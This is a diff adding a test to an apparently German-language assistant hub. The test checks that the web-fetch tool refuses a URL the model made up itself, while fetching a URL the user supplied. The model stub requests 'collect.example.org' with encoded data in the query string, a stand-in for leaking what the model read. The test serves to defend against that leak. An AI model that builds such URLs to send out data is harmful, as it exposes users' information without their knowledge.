@@ -182,6 +182,48 @@ def test_a_search_with_private_data_is_refused_and_still_leaves_no_trace(
     assert row_counts() == before
 
 
+def fetch_then_answer(url: str) -> Any:
+    """A model that asks to read one page and answers once it has the result."""
+
+    def answer(req: dict[str, Any]) -> str | dict[str, Any] | None:
+        if not req.get("messages"):
+            return None
+        if any(m.get("role") == "tool" for m in req["messages"]):
+            return "Gelesen."
+        if not req.get("tools"):
+            return None
+        call = {"name": "web_fetch", "arguments": json.dumps({"url": url})}
+        return {
+            "role": "assistant",
+            "content": "",
+            "tool_calls": [{"id": "c1", "type": "function", "function": call}],
+        }
+
+    return answer
+
+
+def test_only_a_url_of_the_person_or_a_hit_is_read(
+    client: TestClient,
+    model_node: FakeNode,
+    web_node: tuple[str, FakeNode],  # noqa: F811
+) -> None:
+    """Security audit 2026-11-27 (03): a URL the model built may carry what it read."""
+    _, tools = web_node
+    made_up = "https://collect.example.org/?d=WFlaWlktbm9ib2R5"
+    model_node.answer_fn = fetch_then_answer(made_up)
+    tab = new_tab(client)
+    assert ask(client, tab, "Was steht auf https://docs.example.org/oom?").status_code == 200
+    assert tools.capability_calls == []  # never left the hub
+    asked = requests_to_the_model(model_node)[-1]["messages"]
+    assert any(
+        m.get("role") == "tool" and "did not come from this run" in m["content"] for m in asked
+    )
+    # the URL the person wrote in the tab (an earlier message counts too) is read
+    model_node.answer_fn = fetch_then_answer("https://docs.example.org/oom")
+    assert ask(client, tab, "Und jetzt?").status_code == 200
+    assert [c["input"] for c in tools.capability_calls] == [{"url": "https://docs.example.org/oom"}]
+
+
 def test_with_the_internet_off_the_web_is_not_even_offered(
     client: TestClient,
     model_node: FakeNode,
